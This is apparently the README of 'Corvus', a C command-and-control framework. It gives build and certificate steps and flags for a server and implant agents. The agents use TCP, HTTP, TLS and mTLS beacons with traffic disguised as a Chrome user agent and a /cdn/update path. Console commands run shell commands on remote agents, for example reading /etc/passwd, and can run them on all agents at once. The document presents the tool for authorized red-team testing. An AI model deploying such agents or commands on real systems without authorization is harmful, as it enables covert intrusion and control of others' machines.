# Corvus

A lightweight command and control framework written in C, supporting multiple transport modes including raw TCP, HTTP, TLS, HTTPS, and mutual TLS (mTLS).

## Requirements

- GCC or Clang
- OpenSSL (`libssl-dev`) — required for TLS / mTLS / HTTPS modes

```bash
sudo apt install build-essential libssl-dev
```

## Build

```bash
make ssl          # server + agent with TLS/mTLS support (recommended)
make              # server + agent, plain TCP/HTTP only

make ssl-server   # server only
make ssl-agent    # agent only
```

## Certificates

```bash
make certs              # generate CA + server + 1 agent cert
make certs AGENTS=3     # generate CA + server + 3 agent certs
```

## Server

```bash
./build/server/corvus -s <bind> -p <port> -m <mode> [options]
```

| Flag | Alias | Description | Default |
|------|-------|-------------|---------|
| `-s` | | Bind address | `0.0.0.0` |
| `-p` | | Listen port | `4444` |
| `-m` | | Transport mode | `tcp` |
| `--cert` | | TLS certificate | `certs/server/server.crt` |
| `--key` | | TLS private key | `certs/server/server.key` |
| `--ca` | | CA cert (mTLS only) | `certs/server/ca.crt` |
| `--path` | | HTTP beacon path | `/update` |
| `--ua` | | User-Agent to match | Chrome UA |
| `--beacon` | | Beacon interval ms | `3000` |
| `--jitter` | | Jitter percent | `15` |

## Agent

```bash
./build/agent/agent -s <host> -p <port> -m <mode> [options]
```

| Flag | Alias | Description | Default |
|------|-------|-------------|---------|
| `-s` | `-host` | C2 server address | `127.0.0.1` |
| `-p` | `-port` | C2 server port | `4444` |
| `-m` | `-mode` | Transport mode | `tcp` |
| `--cert` | `-cert` | Client certificate | `certs/agent-1/agent.crt` |
| `--key` | `-key` | Client private key | `certs/agent-1/agent.key` |
| `--ca` | `-ca` | CA cert (mTLS only) | `certs/agent-1/ca.crt` |
| `--path` | `-path` | HTTP beacon path | `/update` |
| `--ua` | `-ua` | User-Agent header | Chrome UA |
| `--beacon` | `-beacon` | Beacon interval ms | `3000` |
| `--jitter` | `-jitter` | Jitter percent | `15` |

## Transport Modes

| Mode | Description |
|------|-------------|
| `tcp` / `raw` | Plain TCP socket |
| `http` | HTTP POST beacon |
| `tls` | Raw TLS (server cert not verified) |
| `https` | HTTP over TLS (server cert not verified) |
| `mtls` | Mutual TLS — both sides verify certificates |

## Examples

**TCP**
```bash
./build/server/corvus -s 0.0.0.0 -p 4444 -m tcp
./build/agent/agent     -s 10.0.0.1 -p 4444 -m tcp
```

**HTTP**
```bash
./build/server/corvus -s 0.0.0.0 -p 8080 -m http --path /cdn/update
./build/agent/agent     -s 10.0.0.1 -p 8080 -m http --path /cdn/update
```

**TLS**
```bash
make certs
./build/server/corvus -s 0.0.0.0 -p 443 -m tls \
  --cert certs/server/server.crt \
  --key  certs/server/server.key

./build/agent/agent -s 10.0.0.1 -p 443 -m tls
```

**mTLS**
```bash
make certs AGENTS=2
./build/server/corvus -s 0.0.0.0 -p 4444 -m mtls \
  --cert certs/server/server.crt \
  --key  certs/server/server.key \
  --ca   certs/server/ca.crt

./build/agent/agent -s 10.0.0.1 -p 4444 -m mtls \
  --cert certs/agent-1/agent.crt \
  --key  certs/agent-1/agent.key \
  --ca   certs/agent-1/ca.crt
```

## Console Commands

```
help                     Show help
sessions                 List all active sessions
use <id>                 Enter interactive shell with agent   (alias: interact <id>)
exec <id> <cmd>          Execute command on specific agent without entering session
execall <cmd>            Execute command on all active agents simultaneously
kill <id>                Queue kill for specific agent
kill all                 Queue kill for all agents
info                     Show server configuration
clear                    Clear screen
exit / quit              Shutdown server
```

**Inside a session:**

```
<command>                Execute shell command on agent
back                     Return to server console
kill                     Kill this session
clear                    Clear screen
```

**Examples:**

```bash
exec 2 whoami            # run whoami on session-2 only
exec 3 cat /etc/passwd   # run on session-3 only
execall id               # run id on every connected agent
execall uname -a         # run uname on all agents at once
```

## Legal

For authorized security testing and red team lab use only.

---

<p align="center">
  &copy;Copyright 2023-2026 
  <a href="https://github.com/matrixtm26">@MatrixTM26</a>
  &middot;All right reserved
</p>
